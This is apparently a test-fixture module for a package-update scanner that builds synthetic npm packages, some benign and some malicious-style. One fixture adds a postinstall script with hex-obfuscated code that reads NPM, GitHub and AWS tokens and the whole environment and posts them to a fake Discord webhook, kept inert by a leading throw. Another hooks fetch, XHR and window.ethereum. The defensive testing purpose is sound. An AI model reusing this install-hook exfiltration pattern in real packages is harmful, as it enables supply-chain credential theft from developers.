// Synthetic packages shared by the test suite and scripts/make-fixtures.mjs.
// They are only ever parsed. Every malicious-looking file starts with a `throw`
// so it is inert even if someone ran it, and every endpoint or token is fake.

const pkg = (name, version, extra = {}) =>
  JSON.stringify({ name, version, main: 'index.js', license: 'MIT', ...extra }, null, 2) + '\n';

/** A well-behaved terminal colour helper, version 1.0.0. */
export function benignV1() {
  return {
    'package.json': pkg('tiny-colors', '1.0.0'),
    'index.js': [
      "'use strict';",
      "const os = require('os');",
      "const tty = require('tty');",
      '',
      'function supportsColor() {',
      "  if ('NO_COLOR' in process.env) return false;",
      "  if (process.env.FORCE_COLOR === '0') return false;",
      "  if (process.env.TERM === 'dumb') return false;",
      "  return tty.isatty(1) && os.platform() !== 'unknown';",
      '}',
      '',
      'const codes = { red: [31, 39], green: [32, 39], bold: [1, 22] };',
      'function paint(name, text) {',
      '  if (!supportsColor()) return text;',
      '  const [open, close] = codes[name];',
      "  return '\\x1b[' + open + 'm' + text + '\\x1b[' + close + 'm';",
      '}',
      '',
      'module.exports = { paint, supportsColor };',
      '',
    ].join('\n'),
    'README.md': '# tiny-colors\n\nSee https://github.com/example/tiny-colors for docs.\n',
    LICENSE: 'MIT',
  };
}

/** A normal patch release: a bug fix and one more configuration variable. */
export function benignV2() {
  const files = benignV1();
  files['package.json'] = pkg('tiny-colors', '1.0.1');
  files['index.js'] = files['index.js']
    .replace(
      "if (process.env.TERM === 'dumb') return false;",
      "if (process.env.TERM === 'dumb') return false;\n  if (process.env.COLORTERM === 'truecolor') return true;",
    )
    .replace(
      'const codes = { red: [31, 39], green: [32, 39], bold: [1, 22] };',
      'const codes = { red: [31, 39], green: [32, 39], blue: [34, 39], bold: [1, 22] };',
    );
  return files;
}

const hex = (s) =>
  Array.from(s)
    .map((c) => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0'))
    .join('');

/** The malicious-style update: postinstall + token reads + webhook exfil + obfuscation. */
export function maliciousV2() {
  const files = benignV1();
  files['package.json'] = pkg('tiny-colors', '1.0.2', { scripts: { postinstall: 'node lib/setup.js' } });
  const strings = ['https', 'request', 'write', 'end', 'POST', 'discord.com', 'content-type', 'application/json'];
  const table = strings.map((s) => `'${hex(s)}'`).join(', ');
  files['lib/setup.js'] = [
    '// depdelta test fixture: inert on purpose. Never publish, never run.',
    "throw new Error('depdelta fixture: do not execute');",
    `var _0x4f2a = [${table}];`,
    'function _0x1c3d(_0x2b1e) { return _0x4f2a[_0x2b1e]; }',
    'var _0x5e7a = require(_0x1c3d(0));',
    'var _0x3a9c = process.env.NPM_TOKEN;',
    'var _0x6d1f = process.env.GITHUB_TOKEN;',
    'var _0x7b2e = process.env.AWS_SECRET_ACCESS_KEY;',
    'var _0x8c4d = JSON.stringify({ a: _0x3a9c, b: _0x6d1f, c: _0x7b2e, d: process.env });',
    'var _0x9e5f = require("https").request({',
    "  hostname: 'discord.com',",
    "  path: '/api/webhooks/000000000000000000/depdelta-fixture-not-a-real-webhook',",
    "  method: 'POST',",
    '});',
    '_0x9e5f[_0x1c3d(2)](_0x8c4d);',
    '_0x9e5f[_0x1c3d(3)]();',
    '',
  ].join('\n');
  return files;
}

/** A chalk-2025 style payload: hooks fetch / XHR / window.ethereum and carries wallet addresses. */
export function walletHookV2() {
  const files = benignV2();
  files['package.json'] = pkg('tiny-colors', '1.0.3');
  files['index.js'] += [
    '',
    "if (typeof window !== 'undefined') {",
    "  const _0xaddr = ['0x5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAed', '0xfB6916095ca1df60bB79Ce92cE3Ea74c37c5d359'];",
    '  const _0xorig = window.fetch;',
    '  window.fetch = async function (...args) { return _0xorig.apply(this, args); };',
    '  const _0xopen = XMLHttpRequest.prototype.open;',
    '  XMLHttpRequest.prototype.open = function (m, u) { return _0xopen.apply(this, arguments); };',
    '  if (window.ethereum) { const _0xreq = window.ethereum.request; window.ethereum.request = async function (a) { return _0xreq.call(this, a); }; }',
    '}',
    '',
  ].join('\n');
  return files;
}

/** A package with a legitimate native build step. */
export function nativeAddon(version = '2.0.0') {
  return {
    'package.json': pkg('fast-native', version, { scripts: { install: 'node-gyp-build' }, gypfile: true }),
    'binding.gyp': "{ 'targets': [{ 'target_name': 'fast', 'sources': ['src/fast.cc'] }] }",
    'index.js': "module.exports = require('node-gyp-build')(__dirname);\n",
    'src/fast.cc': '// native code\n',
  };
}

/** A small, boring utility used for "added package" scenarios. */
export function leftPad(version = '1.3.0') {
  return {
    'package.json': pkg('left-pad', version),
    'index.js': "module.exports = function leftPad(str, len, ch) { str = String(str); ch = ch || ' '; while (str.length < len) str = ch + str; return str; };\n",
  };
}

/** @param {Record<string, string>} files */
export function toBuffers(files) {
  return new Map(Object.entries(files).map(([k, v]) => [k, Buffer.from(v, 'utf8')]));
}
